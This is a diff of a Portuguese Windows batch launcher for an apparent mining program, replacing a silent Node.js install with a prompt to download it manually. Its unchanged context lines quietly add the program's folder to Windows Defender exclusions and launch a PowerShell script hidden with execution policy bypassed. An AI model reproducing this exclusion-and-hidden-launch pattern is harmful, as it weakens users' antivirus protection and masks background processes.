@@ -31,10 +31,18 @@ powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1
 :: Verifica se Node.js esta instalado
 where node >nul 2>&1
 if %errorlevel% neq 0 (
-    echo  [!] Node.js nao encontrado. Instalando automaticamente...
+    echo  [!] Node.js nao foi encontrado no seu computador!
+    echo  [!] Para o minerador funcionar, voce precisa do motor Node.js.
     echo.
-    powershell -Command "& {Invoke-WebRequest -Uri 'https://nodejs.org/dist/v20.11.0/node-v20.11.0-x64.msi' -OutFile '%TEMP%\node-setup.msi'; Start-Process msiexec.exe -Wait -ArgumentList '/i %TEMP%\node-setup.msi /quiet /norestart'; $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')}"
-    echo  [OK] Node.js instalado! Reinicie o programa clicando em INICIAR novamente.
+    echo  Abrindo o site oficial para download em 3 segundos...
+    timeout /t 3 /nobreak >nul
+    start https://nodejs.org/en/download/prebuilt-installer
+    echo.
+    echo  PASSOS:
+    echo  1. Baixe o instalador no site que abriu e instale ^(basta clicar em Next/Avancar^).
+    echo  2. Reinicie o seu computador.
+    echo  3. Clique neste arquivo INICIAR novamente.
+    echo.
     pause
     exit /b 0
 )
@@ -46,4 +54,3 @@ powershell -Command "$path=[Environment]::GetFolderPath('Desktop')+'\Software BT
 :: O tray_icon.ps1 vai matar processos antigos, subir o servidor, colocar o icone e abrir o painel
 start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0tray_icon.ps1"
 exit
-
